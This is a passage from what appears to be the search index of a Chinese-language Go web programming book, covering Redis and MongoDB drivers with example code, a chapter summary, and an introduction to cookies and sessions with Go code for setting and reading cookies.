3,\nIdleTimeout: 240 * time.Second,\n\nDial: func() (redis.Conn, error) {\nc, err := redis.Dial(\"tcp\", server)\nif err != nil {\nreturn nil, err\n}\nreturn c, err\n},\n\nTestOnBorrow: func(c redis.Conn, t time.Time) error {\n_, err := c.Do(\"PING\")\nreturn err\n}\n}\n}\n\nfunc close() {\nc := make(chan os.Signal, 1)\nsignal.Notify(c, os.Interrupt)\nsignal.Notify(c, syscall.SIGTERM)\nsignal.Notify(c, syscall.SIGKILL)\ngo func() {\n&lt;-c\nPool.Close()\nos.Exit(0)\n}()\n}\n\nfunc Get(key string) ([]byte, error) {\n\nconn := Pool.Get()\ndefer conn.Close()\n\nvar data []byte\ndata, err := redis.Bytes(conn.Do(\"GET\", key))\nif err != nil {\nreturn data, fmt.Errorf(\"error get key %s: %v\", key, err)\n}\nreturn data, err\n}\n\nfunc main() {\ntest, err := Get(\"test\")\nfmt.Println(test, err)\n}\n</code></pre></p> <p>\u53e6\u5916\u4ee5\u524d\u6211fork\u4e86\u6700\u540e\u4e00\u4e2a\u9a71\u52a8\uff0c\u4fee\u590d\u4e86\u4e00\u4e9bbug\uff0c\u76ee\u524d\u5e94\u7528\u5728\u6211\u81ea\u5df1\u7684\u77ed\u57df\u540d\u670d\u52a1\u9879\u76ee\u4e2d(\u6bcf\u5929200W\u5de6\u53f3\u7684PV\u503c)</p> <p>https://github.com/astaxie/goredis</p> <p>\u63a5\u4e0b\u6765\u7684\u4ee5\u6211\u81ea\u5df1fork\u7684\u8fd9\u4e2aredis\u9a71\u52a8\u4e3a\u4f8b\u6765\u6f14\u793a\u5982\u4f55\u8fdb\u884c\u6570\u636e\u7684\u64cd\u4f5c <pre><code>package main\n\nimport (\n\"fmt\"\n\n\"github.com/astaxie/goredis\"\n)\n\nfunc main() {\nvar client goredis.Client\n// \u8bbe\u7f6e\u7aef\u53e3\u4e3aredis\u9ed8\u8ba4\u7aef\u53e3\nclient.Addr = \"127.0.0.1:6379\"\n\n//\u5b57\u7b26\u4e32\u64cd\u4f5c\nclient.Set(\"a\", []byte(\"hello\"))\nval, _ := client.Get(\"a\")\nfmt.Println(string(val))\nclient.Del(\"a\")\n\n//list\u64cd\u4f5c\nvals := []string{\"a\", \"b\", \"c\", \"d\", \"e\"}\nfor _, v := range vals {\nclient.Rpush(\"l\", []byte(v))\n}\ndbvals,_ := client.Lrange(\"l\", 0, 4)\nfor i, v := range dbvals {\nprintln(i,\":\",string(v))\n}\nclient.Del(\"l\")\n}\n</code></pre> \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u64cd\u4f5credis\u975e\u5e38\u7684\u65b9\u4fbf\uff0c\u800c\u4e14\u6211\u5b9e\u9645\u9879\u76ee\u4e2d\u5e94\u7528\u4e0b\u6765\u6027\u80fd\u4e5f\u5f88\u9ad8\u3002client\u7684\u547d\u4ee4\u548credis\u7684\u547d\u4ee4\u57fa\u672c\u4fdd\u6301\u4e00\u81f4\u3002\u6240\u4ee5\u548c\u539f\u751f\u6001\u64cd\u4f5credis\u975e\u5e38\u7c7b\u4f3c\u3002</p>"},{"location":"05.6/#mongodb","title":"mongoDB","text":"<p>MongoDB\u662f\u4e00\u4e2a\u9ad8\u6027\u80fd\uff0c\u5f00\u6e90\uff0c\u65e0\u6a21\u5f0f\u7684\u6587\u6863\u578b\u6570\u636e\u5e93\uff0c\u662f\u4e00\u4e2a\u4ecb\u4e8e\u5173\u7cfb\u6570\u636e\u5e93\u548c\u975e\u5173\u7cfb\u6570\u636e\u5e93\u4e4b\u95f4\u7684\u4ea7\u54c1\uff0c\u662f\u975e\u5173\u7cfb\u6570\u636e\u5e93\u5f53\u4e2d\u529f\u80fd\u6700\u4e30\u5bcc\uff0c\u6700\u50cf\u5173\u7cfb\u6570\u636e\u5e93\u7684\u3002\u4ed6\u652f\u6301\u7684\u6570\u636e\u7ed3\u6784\u975e\u5e38\u677e\u6563\uff0c\u91c7\u7528\u7684\u662f\u7c7b\u4f3cjson\u7684bjson\u683c\u5f0f\u6765\u5b58\u50a8\u6570\u636e\uff0c\u56e0\u6b64\u53ef\u4ee5\u5b58\u50a8\u6bd4\u8f83\u590d\u6742\u7684\u6570\u636e\u7c7b\u578b\u3002Mongo\u6700\u5927\u7684\u7279\u70b9\u662f\u4ed6\u652f\u6301\u7684\u67e5\u8be2\u8bed\u8a00\u975e\u5e38\u5f3a\u5927\uff0c\u5176\u8bed\u6cd5\u6709\u70b9\u7c7b\u4f3c\u4e8e\u9762\u5411\u5bf9\u8c61\u7684\u67e5\u8be2\u8bed\u8a00\uff0c\u51e0\u4e4e\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u4f3c\u5173\u7cfb\u6570\u636e\u5e93\u5355\u8868\u67e5\u8be2\u7684\u7edd\u5927\u90e8\u5206\u529f\u80fd\uff0c\u800c\u4e14\u8fd8\u652f\u6301\u5bf9\u6570\u636e\u5efa\u7acb\u7d22\u5f15\u3002</p> <p>\u4e0b\u56fe\u5c55\u793a\u4e86mysql\u548cmongoDB\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u6765\u975e\u5e38\u7684\u65b9\u4fbf\uff0c\u4f46\u662fmongoDB\u7684\u6027\u80fd\u975e\u5e38\u597d\u3002</p> <p></p> <p>\u56fe5.1 MongoDB\u548cMysql\u7684\u64cd\u4f5c\u5bf9\u6bd4\u56fe</p> <p>\u76ee\u524dGo\u652f\u6301mongoDB\u6700\u597d\u7684\u9a71\u52a8\u5c31\u662fmgo\uff0c\u8fd9\u4e2a\u9a71\u52a8\u76ee\u524d\u6700\u6709\u53ef\u80fd\u6210\u4e3a\u5b98\u65b9\u7684pkg\u3002</p> <p>\u5b89\u88c5mgo:</p> <pre><code>go get gopkg.in/mgo.v2\n</code></pre> <p>\u4e0b\u9762\u6211\u5c06\u6f14\u793a\u5982\u4f55\u901a\u8fc7Go\u6765\u64cd\u4f5cmongoDB\uff1a <pre><code>package main\n\nimport (\n\"fmt\"\n\"log\"\n\n\"gopkg.in/mgo.v2\"\n\"gopkg.in/mgo.v2/bson\"\n)\n\ntype Person struct {\nName  string\nPhone string\n}\n\nfunc main() {\nsession, err := mgo.Dial(\"server1.example.com,server2.example.com\")\nif err != nil {\npanic(err)\n}\ndefer session.Close()\n\n// Optional. Switch the session to a monotonic behavior.\nsession.SetMode(mgo.Monotonic, true)\n\nc := session.DB(\"test\").C(\"people\")\nerr = c.Insert(&amp;Person{\"Ale\", \"+55 53 8116 9639\"},\n&amp;Person{\"Cla\", \"+55 53 8402 8510\"})\nif err != nil {\nlog.Fatal(err)\n}\n\nresult := Person{}\nerr = c.Find(bson.M{\"name\": \"Ale\"}).One(&amp;result)\nif err != nil {\nlog.Fatal(err)\n}\n\nfmt.Println(\"Phone:\", result.Phone)\n}\n</code></pre> \u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u6765mgo\u7684\u64cd\u4f5c\u65b9\u5f0f\u548cbeedb\u7684\u64cd\u4f5c\u65b9\u5f0f\u51e0\u4e4e\u7c7b\u4f3c\uff0c\u90fd\u662f\u57fa\u4e8estruct\u7684\u64cd\u4f5c\u65b9\u5f0f\uff0c\u8fd9\u4e2a\u5c31\u662fGo Style\u3002</p>"},{"location":"05.6/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u4f7f\u7528Beego orm\u5e93\u8fdb\u884cORM\u5f00\u53d1</li> <li>\u4e0b\u4e00\u8282: \u5c0f\u7ed3</li> </ul>"},{"location":"05.7/","title":"5.7 \u5c0f\u7ed3","text":"<p>\u8fd9\u4e00\u7ae0\u6211\u4eec\u8bb2\u89e3\u4e86Go\u5982\u4f55\u8bbe\u8ba1database/sql\u63a5\u53e3\uff0c\u7136\u540e\u4ecb\u7ecd\u4e86\u5404\u79cd\u7b2c\u4e09\u65b9\u5173\u7cfb\u578b\u6570\u636e\u5e93\u9a71\u52a8\u7684\u4f7f\u7528\u3002\u63a5\u7740\u4ecb\u7ecd\u4e86beedb\uff0c\u4e00\u79cd\u57fa\u4e8e\u5173\u7cfb\u578b\u6570\u636e\u5e93\u7684ORM\u5e93\uff0c\u5982\u4f55\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u7b80\u5355\u7684\u64cd\u4f5c\u3002\u6700\u540e\u4ecb\u7ecd\u4e86NOSQL\u7684\u4e00\u4e9b\u77e5\u8bc6\uff0c\u76ee\u524dGo\u5bf9\u4e8eNOSQL\u652f\u6301\u8fd8\u662f\u4e0d\u9519\uff0c\u56e0\u4e3aGo\u4f5c\u4e3a21\u4e16\u7eaa\u7684C\u8bed\u8a00\uff0c\u90a3\u4e48\u5bf9\u4e8e21\u4e16\u7eaa\u7684\u6570\u636e\u5e93\u4e5f\u662f\u652f\u6301\u7684\u76f8\u5f53\u597d\u3002</p> <p>\u901a\u8fc7\u8fd9\u4e00\u7ae0\u7684\u5b66\u4e60\uff0c\u6211\u4eec\u5b66\u4f1a\u4e86\u5982\u4f55\u64cd\u4f5c\u5404\u79cd\u6570\u636e\u5e93\uff0c\u90a3\u4e48\u5c31\u89e3\u51b3\u4e86\u6211\u4eec\u6570\u636e\u5b58\u50a8\u7684\u95ee\u9898\uff0c\u8fd9\u662fWeb\u91cc\u9762\u6700\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u6240\u4ee5\u5e0c\u671b\u5927\u5bb6\u80fd\u591f\u6df1\u5165\u7684\u53bb\u4e86\u89e3database/sql\u7684\u8bbe\u8ba1\u601d\u60f3\u3002</p> <p>Go database/sql tutorial \u91cc\u63d0\u4f9b\u4e86\u60ef\u7528\u7684\u8303\u4f8b\u53ca\u8be6\u7ec6\u7684\u8bf4\u660e\u3002</p>"},{"location":"05.7/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: NOSQL\u6570\u636e\u5e93\u64cd\u4f5c</li> <li>\u4e0b\u4e00\u7ae0: session\u548c\u6570\u636e\u5b58\u50a8</li> </ul>"},{"location":"06.0/","title":"6 session\u548c\u6570\u636e\u5b58\u50a8","text":"<p>Web\u5f00\u53d1\u4e2d\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u8bae\u9898\u5c31\u662f\u5982\u4f55\u505a\u597d\u7528\u6237\u7684\u6574\u4e2a\u6d4f\u89c8\u8fc7\u7a0b\u7684\u63a7\u5236\uff0c\u56e0\u4e3aHTTP\u534f\u8bae\u662f\u65e0\u72b6\u6001\u7684\uff0c\u6240\u4ee5\u7528\u6237\u7684\u6bcf\u4e00\u6b21\u8bf7\u6c42\u90fd\u662f\u65e0\u72b6\u6001\u7684\uff0c\u6211\u4eec\u4e0d\u77e5\u9053\u5728\u6574\u4e2aWeb\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u54ea\u4e9b\u8fde\u63a5\u4e0e\u8be5\u7528\u6237\u6709\u5173\uff0c\u6211\u4eec\u5e94\u8be5\u5982\u4f55\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u5462\uff1fWeb\u91cc\u9762\u7ecf\u5178\u7684\u89e3\u51b3\u65b9\u6848\u662fcookie\u548csession\uff0ccookie\u673a\u5236\u662f\u4e00\u79cd\u5ba2\u6237\u7aef\u673a\u5236\uff0c\u628a\u7528\u6237\u6570\u636e\u4fdd\u5b58\u5728\u5ba2\u6237\u7aef\uff0c\u800csession\u673a\u5236\u662f\u4e00\u79cd\u670d\u52a1\u5668\u7aef\u7684\u673a\u5236\uff0c\u670d\u52a1\u5668\u4f7f\u7528\u4e00\u79cd\u7c7b\u4f3c\u4e8e\u6563\u5217\u8868\u7684\u7ed3\u6784\u6765\u4fdd\u5b58\u4fe1\u606f\uff0c\u6bcf\u4e00\u4e2a\u7f51\u7ad9\u8bbf\u5ba2\u90fd\u4f1a\u88ab\u5206\u914d\u7ed9\u4e00\u4e2a\u552f\u4e00\u7684\u6807\u5fd7\u7b26,\u5373sessionID,\u5b83\u7684\u5b58\u653e\u5f62\u5f0f\u65e0\u975e\u4e24\u79cd:\u8981\u4e48\u7ecf\u8fc7url\u4f20\u9012,\u8981\u4e48\u4fdd\u5b58\u5728\u5ba2\u6237\u7aef\u7684cookies\u91cc.\u5f53\u7136,\u4f60\u4e5f\u53ef\u4ee5\u5c06Session\u4fdd\u5b58\u5230\u6570\u636e\u5e93\u91cc,\u8fd9\u6837\u4f1a\u66f4\u5b89\u5168,\u4f46\u6548\u7387\u65b9\u9762\u4f1a\u6709\u6240\u4e0b\u964d\u3002</p> <p>6.1\u5c0f\u8282\u91cc\u9762\u8bb2\u4ecb\u7ecdsession\u673a\u5236\u548ccookie\u673a\u5236\u7684\u5173\u7cfb\u548c\u533a\u522b\uff0c6.2\u8bb2\u89e3Go\u8bed\u8a00\u5982\u4f55\u6765\u5b9e\u73b0session\uff0c\u91cc\u9762\u8bb2\u5b9e\u73b0\u4e00\u4e2a\u7b80\u6613\u7684session\u7ba1\u7406\u5668\uff0c6.3\u5c0f\u8282\u8bb2\u89e3\u5982\u4f55\u9632\u6b62session\u88ab\u52ab\u6301\u7684\u60c5\u51b5\uff0c\u5982\u4f55\u6709\u6548\u7684\u4fdd\u62a4session\u3002\u6211\u4eec\u77e5\u9053session\u5176\u5b9e\u53ef\u4ee5\u5b58\u50a8\u5728\u4efb\u4f55\u5730\u65b9\uff0c6.4\u5c0f\u8282\u91cc\u9762\u5b9e\u73b0\u7684session\u662f\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u7684\u5e94\u7528\u8fdb\u4e00\u6b65\u6269\u5c55\u4e86\uff0c\u8981\u5b9e\u73b0\u5e94\u7528\u7684session\u5171\u4eab\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u628asession\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d(memcache\u6216\u8005redis)\uff0c6.5\u5c0f\u8282\u5c06\u8be6\u7ec6\u7684\u8bb2\u89e3\u5982\u4f55\u5b9e\u73b0\u8fd9\u4e9b\u529f\u80fd\u3002</p>"},{"location":"06.0/#_1","title":"\u76ee\u5f55","text":""},{"location":"06.0/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u7b2c\u4e94\u7ae0\u603b\u7ed3</li> <li>\u4e0b\u4e00\u8282: session\u548ccookie</li> </ul>"},{"location":"06.1/","title":"6.1 session\u548ccookie","text":"<p>session\u548ccookie\u662f\u7f51\u7ad9\u6d4f\u89c8\u4e2d\u8f83\u4e3a\u5e38\u89c1\u7684\u4e24\u4e2a\u6982\u5ff5\uff0c\u4e5f\u662f\u6bd4\u8f83\u96be\u4ee5\u8fa8\u6790\u7684\u4e24\u4e2a\u6982\u5ff5\uff0c\u4f46\u5b83\u4eec\u5728\u6d4f\u89c8\u9700\u8981\u8ba4\u8bc1\u7684\u670d\u52a1\u9875\u9762\u4ee5\u53ca\u9875\u9762\u7edf\u8ba1\u4e2d\u5374\u76f8\u5f53\u5173\u952e\u3002\u6211\u4eec\u5148\u6765\u4e86\u89e3\u4e00\u4e0bsession\u548ccookie\u600e\u4e48\u6765\u7684\uff1f\u8003\u8651\u8fd9\u6837\u4e00\u4e2a\u95ee\u9898\uff1a</p> <p>\u5982\u4f55\u6293\u53d6\u4e00\u4e2a\u8bbf\u95ee\u53d7\u9650\u7684\u7f51\u9875\uff1f\u5982\u65b0\u6d6a\u5fae\u535a\u597d\u53cb\u7684\u4e3b\u9875\uff0c\u4e2a\u4eba\u5fae\u535a\u9875\u9762\u7b49\u3002</p> <p>\u663e\u7136\uff0c\u901a\u8fc7\u6d4f\u89c8\u5668\uff0c\u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u8f93\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801\u6765\u8bbf\u95ee\u9875\u9762\uff0c\u800c\u6240\u8c13\u7684\u201c\u6293\u53d6\u201d\uff0c\u5176\u5b9e\u5c31\u662f\u4f7f\u7528\u7a0b\u5e8f\u6765\u6a21\u62df\u5b8c\u6210\u540c\u6837\u7684\u5de5\u4f5c\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u4e86\u89e3\u201c\u767b\u5f55\u201d\u8fc7\u7a0b\u4e2d\u5230\u5e95\u53d1\u751f\u4e86\u4ec0\u4e48\u3002</p> <p>\u5f53\u7528\u6237\u6765\u5230\u5fae\u535a\u767b\u5f55\u9875\u9762\uff0c\u8f93\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801\u4e4b\u540e\u70b9\u51fb\u201c\u767b\u5f55\u201d\u540e\u6d4f\u89c8\u5668\u5c06\u8ba4\u8bc1\u4fe1\u606fPOST\u7ed9\u8fdc\u7aef\u7684\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u6267\u884c\u9a8c\u8bc1\u903b\u8f91\uff0c\u5982\u679c\u9a8c\u8bc1\u901a\u8fc7\uff0c\u5219\u6d4f\u89c8\u5668\u4f1a\u8df3\u8f6c\u5230\u767b\u5f55\u7528\u6237\u7684\u5fae\u535a\u9996\u9875\uff0c\u5728\u767b\u5f55\u6210\u529f\u540e\uff0c\u670d\u52a1\u5668\u5982\u4f55\u9a8c\u8bc1\u6211\u4eec\u5bf9\u5176\u4ed6\u53d7\u9650\u5236\u9875\u9762\u7684\u8bbf\u95ee\u5462\uff1f\u56e0\u4e3aHTTP\u534f\u8bae\u662f\u65e0\u72b6\u6001\u7684\uff0c\u6240\u4ee5\u5f88\u663e\u7136\u670d\u52a1\u5668\u4e0d\u53ef\u80fd\u77e5\u9053\u6211\u4eec\u5df2\u7ecf\u5728\u4e0a\u4e00\u6b21\u7684HTTP\u8bf7\u6c42\u4e2d\u901a\u8fc7\u4e86\u9a8c\u8bc1\u3002\u5f53\u7136\uff0c\u6700\u7b80\u5355\u7684\u89e3\u51b3\u65b9\u6848\u5c31\u662f\u6240\u6709\u7684\u8bf7\u6c42\u91cc\u9762\u90fd\u5e26\u4e0a\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u8fd9\u6837\u867d\u7136\u53ef\u884c\uff0c\u4f46\u5927\u5927\u52a0\u91cd\u4e86\u670d\u52a1\u5668\u7684\u8d1f\u62c5\uff08\u5bf9\u4e8e\u6bcf\u4e2arequest\u90fd\u9700\u8981\u5230\u6570\u636e\u5e93\u9a8c\u8bc1\uff09\uff0c\u4e5f\u5927\u5927\u964d\u4f4e\u4e86\u7528\u6237\u4f53\u9a8c(\u6bcf\u4e2a\u9875\u9762\u90fd\u9700\u8981\u91cd\u65b0\u8f93\u5165\u7528\u6237\u540d\u5bc6\u7801\uff0c\u6bcf\u4e2a\u9875\u9762\u90fd\u5e26\u6709\u767b\u5f55\u8868\u5355)\u3002\u65e2\u7136\u76f4\u63a5\u5728\u8bf7\u6c42\u4e2d\u5e26\u4e0a\u7528\u6237\u540d\u4e0e\u5bc6\u7801\u4e0d\u53ef\u884c\uff0c\u90a3\u4e48\u5c31\u53ea\u6709\u5728\u670d\u52a1\u5668\u6216\u5ba2\u6237\u7aef\u4fdd\u5b58\u4e00\u4e9b\u7c7b\u4f3c\u7684\u53ef\u4ee5\u4ee3\u8868\u8eab\u4efd\u7684\u4fe1\u606f\u4e86\uff0c\u6240\u4ee5\u5c31\u6709\u4e86cookie\u4e0esession\u3002</p> <p>cookie\uff0c\u7b80\u800c\u8a00\u4e4b\u5c31\u662f\u5728\u672c\u5730\u8ba1\u7b97\u673a\u4fdd\u5b58\u4e00\u4e9b\u7528\u6237\u64cd\u4f5c\u7684\u5386\u53f2\u4fe1\u606f\uff08\u5f53\u7136\u5305\u62ec\u767b\u5f55\u4fe1\u606f\uff09\uff0c\u5e76\u5728\u7528\u6237\u518d\u6b21\u8bbf\u95ee\u8be5\u7ad9\u70b9\u65f6\u6d4f\u89c8\u5668\u901a\u8fc7HTTP\u534f\u8bae\u5c06\u672c\u5730cookie\u5185\u5bb9\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u4ece\u800c\u5b8c\u6210\u9a8c\u8bc1\uff0c\u6216\u7ee7\u7eed\u4e0a\u4e00\u6b65\u64cd\u4f5c\u3002</p> <p></p> <p>\u56fe6.1 cookie\u7684\u539f\u7406\u56fe</p> <p>session\uff0c\u7b80\u800c\u8a00\u4e4b\u5c31\u662f\u5728\u670d\u52a1\u5668\u4e0a\u4fdd\u5b58\u7528\u6237\u64cd\u4f5c\u7684\u5386\u53f2\u4fe1\u606f\u3002\u670d\u52a1\u5668\u4f7f\u7528session id\u6765\u6807\u8bc6session\uff0csession id\u7531\u670d\u52a1\u5668\u8d1f\u8d23\u4ea7\u751f\uff0c\u4fdd\u8bc1\u968f\u673a\u6027\u4e0e\u552f\u4e00\u6027\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u968f\u673a\u5bc6\u94a5\uff0c\u907f\u514d\u5728\u63e1\u624b\u6216\u4f20\u8f93\u4e2d\u66b4\u9732\u7528\u6237\u771f\u5b9e\u5bc6\u7801\u3002\u4f46\u8be5\u65b9\u5f0f\u4e0b\uff0c\u4ecd\u7136\u9700\u8981\u5c06\u53d1\u9001\u8bf7\u6c42\u7684\u5ba2\u6237\u7aef\u4e0esession\u8fdb\u884c\u5bf9\u5e94\uff0c\u6240\u4ee5\u53ef\u4ee5\u501f\u52a9cookie\u673a\u5236\u6765\u83b7\u53d6\u5ba2\u6237\u7aef\u7684\u6807\u8bc6\uff08\u5373session id\uff09\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7GET\u65b9\u5f0f\u5c06id\u63d0\u4ea4\u7ed9\u670d\u52a1\u5668\u3002</p> <p></p> <p>\u56fe6.2 session\u7684\u539f\u7406\u56fe</p>"},{"location":"06.1/#cookie","title":"cookie","text":"<p>Cookie\u662f\u7531\u6d4f\u89c8\u5668\u7ef4\u6301\u7684\uff0c\u5b58\u50a8\u5728\u5ba2\u6237\u7aef\u7684\u4e00\u5c0f\u6bb5\u6587\u672c\u4fe1\u606f\uff0c\u4f34\u968f\u7740\u7528\u6237\u8bf7\u6c42\u548c\u9875\u9762\u5728Web\u670d\u52a1\u5668\u548c\u6d4f\u89c8\u5668\u4e4b\u95f4\u4f20\u9012\u3002\u7528\u6237\u6bcf\u6b21\u8bbf\u95ee\u7ad9\u70b9\u65f6\uff0cWeb\u5e94\u7528\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u8bfb\u53d6cookie\u5305\u542b\u7684\u4fe1\u606f\u3002\u6d4f\u89c8\u5668\u8bbe\u7f6e\u91cc\u9762\u6709cookie\u9690\u79c1\u6570\u636e\u9009\u9879\uff0c\u6253\u5f00\u5b83\uff0c\u53ef\u4ee5\u770b\u5230\u5f88\u591a\u5df2\u8bbf\u95ee\u7f51\u7ad9\u7684cookies\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u56fe6.3 \u6d4f\u89c8\u5668\u7aef\u4fdd\u5b58\u7684cookie\u4fe1\u606f</p> <p>cookie\u662f\u6709\u65f6\u95f4\u9650\u5236\u7684\uff0c\u6839\u636e\u751f\u547d\u671f\u4e0d\u540c\u5206\u6210\u4e24\u79cd\uff1a\u4f1a\u8bddcookie\u548c\u6301\u4e45cookie\uff1b</p> <p>\u5982\u679c\u4e0d\u8bbe\u7f6e\u8fc7\u671f\u65f6\u95f4\uff0c\u5219\u8868\u793a\u8fd9\u4e2acookie\u7684\u751f\u547d\u5468\u671f\u4e3a\u4ece\u521b\u5efa\u5230\u6d4f\u89c8\u5668\u5173\u95ed\u4e3a\u6b62\uff0c\u53ea\u8981\u5173\u95ed\u6d4f\u89c8\u5668\u7a97\u53e3\uff0ccookie\u5c31\u6d88\u5931\u4e86\u3002\u8fd9\u79cd\u751f\u547d\u671f\u4e3a\u6d4f\u89c8\u4f1a\u8bdd\u671f\u7684cookie\u88ab\u79f0\u4e3a\u4f1a\u8bddcookie\u3002\u4f1a\u8bddcookie\u4e00\u822c\u4e0d\u4fdd\u5b58\u5728\u786c\u76d8\u4e0a\u800c\u662f\u4fdd\u5b58\u5728\u5185\u5b58\u91cc\u3002</p> <p>\u5982\u679c\u8bbe\u7f6e\u4e86\u8fc7\u671f\u65f6\u95f4(setMaxAge(60*60*24))\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u628acookie\u4fdd\u5b58\u5230\u786c\u76d8\u4e0a\uff0c\u5173\u95ed\u540e\u518d\u6b21\u6253\u5f00\u6d4f\u89c8\u5668\uff0c\u8fd9\u4e9bcookie\u4f9d\u7136\u6709\u6548\u76f4\u5230\u8d85\u8fc7\u8bbe\u5b9a\u7684\u8fc7\u671f\u65f6\u95f4\u3002\u5b58\u50a8\u5728\u786c\u76d8\u4e0a\u7684cookie\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u8fdb\u7a0b\u95f4\u5171\u4eab\uff0c\u6bd4\u5982\u4e24\u4e2aIE\u7a97\u53e3\u3002\u800c\u5bf9\u4e8e\u4fdd\u5b58\u5728\u5185\u5b58\u7684cookie\uff0c\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u6709\u4e0d\u540c\u7684\u5904\u7406\u65b9\u5f0f\u3002 \u3000\u3000</p>"},{"location":"06.1/#gocookie","title":"Go\u8bbe\u7f6ecookie","text":"<p>Go\u8bed\u8a00\u4e2d\u901a\u8fc7net/http\u5305\u4e2d\u7684SetCookie\u6765\u8bbe\u7f6e\uff1a <pre><code>http.SetCookie(w ResponseWriter, cookie *Cookie)\n</code></pre> w\u8868\u793a\u9700\u8981\u5199\u5165\u7684response\uff0ccookie\u662f\u4e00\u4e2astruct\uff0c\u8ba9\u6211\u4eec\u6765\u770b\u4e00\u4e0bcookie\u5bf9\u8c61\u662f\u600e\u4e48\u6837\u7684 <pre><code>type Cookie struct {\nName       string\nValue      string\nPath       string\nDomain     string\nExpires    time.Time\nRawExpires string\n\n// MaxAge=0 means no 'Max-Age' attribute specified.\n// MaxAge&lt;0 means delete cookie now, equivalently 'Max-Age: 0'\n// MaxAge&gt;0 means Max-Age attribute present and given in seconds\nMaxAge   int\nSecure   bool\nHttpOnly bool\nRaw      string\nUnparsed []string // Raw text of unparsed attribute-value pairs\n}\n</code></pre> \u6211\u4eec\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u4f55\u8bbe\u7f6ecookie <pre><code>expiration := time.Now()\nexpiration = expiration.AddDate(1, 0, 0)\ncookie := http.Cookie{Name: \"username\", Value: \"astaxie\", Expires: expiration}\nhttp.SetCookie(w, &amp;cookie)\n</code></pre> </p>"},{"location":"06.1/#gocookie_1","title":"Go\u8bfb\u53d6cookie","text":"<p>\u4e0a\u9762\u7684\u4f8b\u5b50\u6f14\u793a\u4e86\u5982\u4f55\u8bbe\u7f6ecookie\u6570\u636e\uff0c\u6211\u4eec\u8fd9\u91cc\u6765\u6f14\u793a\u4e00\u4e0b\u5982\u4f55\u8bfb\u53d6cookie <pre><code>cookie, _ := r.Cookie(\"username\")\nfmt.Fprint(w, cookie)\n</code></pre> \u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u8bfb\u53d6\u65b9\u5f0f <pre><code>for _, cookie := range r.Cookies() {\nfmt.Fprint(w, cookie.Name)\n}\n</code></pre> \u53ef\u4ee5\u770b\u5230\u901a\u8fc7request\u83b7\u53d6cookie\u975e\u5e38\u65b9\u4fbf\u3002</p>"},{"location":"06.1/#session","title":"session","text":"<p>session\uff0c\u4e2d\u6587\u7ecf\u5e38\u7ffb\u8bd1\u4e3a\u4f1a\u8bdd\uff0c\u5176\u672c\u6765\u7684\u542b\u4e49\u662f\u6307\u6709\u59cb\u6709\u7ec8\u7684\u4e00\u7cfb\u5217\u52a8\u4f5c/\u6d88\u606f\uff0c\u6bd4\u5982\u6253\u7535\u8bdd\u662f\u4ece\u62ff\u8d77\u7535\u8bdd\u62e8\u53f7\u5230\u6302\u65ad\u7535\u8bdd\u8fd9\u4e2d\u95f4\u7684\u4e00\u7cfb\u5217\u8fc7\u7a0b\u53ef\u4ee5\u79f0\u4e4b\u4e3a\u4e00\u4e2asession\u3002\u7136\u800c\u5f53session\u4e00\u8bcd\u4e0e\u7f51\u7edc\u534f\u8bae\u76f8\u5173\u8054\u65f6\uff0c\u5b83\u53c8\u5f80\u5f80\u9690\u542b\u4e86\u201c\u9762\u5411\u8fde\u63a5\u201d\u548c/\u6216\u201c\u4fdd\u6301\u72b6\u6001\u201d\u8fd9\u6837\u4e24\u4e2a\u542b\u4e49\u3002</p> <p>session\u5728Web\u5f00\u53d1\u73af\u5883\u4e0b\u7684\u8bed\u4e49\u53c8\u6709\u4e86\u65b0\u7684\u6269\u5c55\uff0c\u5b83\u7684\u542b\u4e49\u662f\u6307\u4e00\u7c7b\u7528\u6765\u5728\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u5668\u7aef\u4e4b\u95f4\u4fdd\u6301\u72b6\u6001\u7684\u89e3\u51b3\u65b9\u6848\u3002\u6709\u65f6\u5019Session\u4e5f\u7528\u6765\u6307\u8fd9\u79cd\u89e3\u51b3\u65b9\u6848\u7684\u5b58\u50a8\u7ed3\u6784\u3002</p> <p>session\u673a\u5236\u662f\u4e00\u79cd\u670d\u52a1\u5668\u7aef\u7684\u673a\u5236\uff0c\u670d\u52a1\u5668\u4f7f\u7528\u4e00\u79cd\u7c7b\u4f3c\u4e8e\u6563\u5217\u8868\u7684\u7ed3\u6784(\u4e5f\u53ef\u80fd\u5c31\u662f\u4f7f\u7528\u6563\u5217\u8868)\u6765\u4fdd\u5b58\u4fe1\u606f\u3002</p> 